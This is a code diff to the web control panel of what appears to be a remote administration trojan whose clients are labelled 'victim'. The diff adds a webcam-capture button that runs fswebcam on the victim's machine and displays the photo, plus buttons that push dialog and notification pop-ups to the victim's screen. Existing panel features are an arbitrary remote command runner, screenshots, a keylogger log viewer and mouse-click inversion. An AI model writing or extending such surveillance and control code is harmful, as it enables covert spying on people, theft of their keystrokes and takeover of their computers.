@@ -48,6 +48,33 @@
 
   $(document).ready(function() {
 
+    $("#pic").on('click', function() { 
+            
+            var random = Math.floor(Math.random() * 1000000) + 1;
+          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'fswebcam /var/www/html/'+random+'.jpg' }, function (data) {
+
+              $("#screen-op-body").html("<img style='width:100%' src='http://" + ips[$("#victim").val()] + "/" + random + ".jpg'></img>");
+                $("#screen-op").modal('show');
+
+          });   
+          
+    });
+
+
+
+    //Messages
+
+     $("#zenity").on('click', function() { 
+          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'zenity --error --text="' + $("#zenityvalue").val() + '" --title="Alert\!"' }, function (data) { });
+      });
+
+       $("#notify").on('click', function() { 
+          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'notify-send "' + $("#notifyvalue").val() + '"' }, function (data) { });
+      });
+
+
+
+
 
 
     $("#keypressinv").on('click', function() { 
@@ -60,14 +87,11 @@
 
 
       $("#runcmd").on('click', function() { 
-
           socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: $("#cmdinput").val() }, function (data) {
               
                 $("#cmd-op-body").html(data);
                 $("#cmd-op").modal('show');
           });
-
-          
       });
 
     $("#screen").on('click', function() { 
@@ -176,6 +200,19 @@
   </div>
 
   <div class="row">
+    <div class="col-sm-4">
+      <h3>Dialog Boxes</h3>
+        <input id="notifyvalue" placeholder="Enter text"></input><button id="notify">Show Notification</button> 
+    </div>
+
+    <div class="col-sm-8" >
+      <h3>Dialog Boxes</h3>
+        <input id="zenityvalue" placeholder="Enter text"></input><button id="zenity">Show Dialog</button> 
+    </div>
+
+  </div>
+
+  <div class="row">
     <div class="col-sm-4" id="operations">
         
       <h3>Remote Commands</h3>
@@ -202,6 +239,7 @@
         
       <h3>Telemetry.</h3>
         <button id="screen">Screenshot</button> <br/> <br/> 
+        <button id="pic">Webcam Capture</button> <br/> <br/> 
         <button id="keylogger">View Keylogger Logs</button> <br/> <br/> 
         
         <button id="keypressinv">Invert Mouse clicks</button> <br/> <br/> 
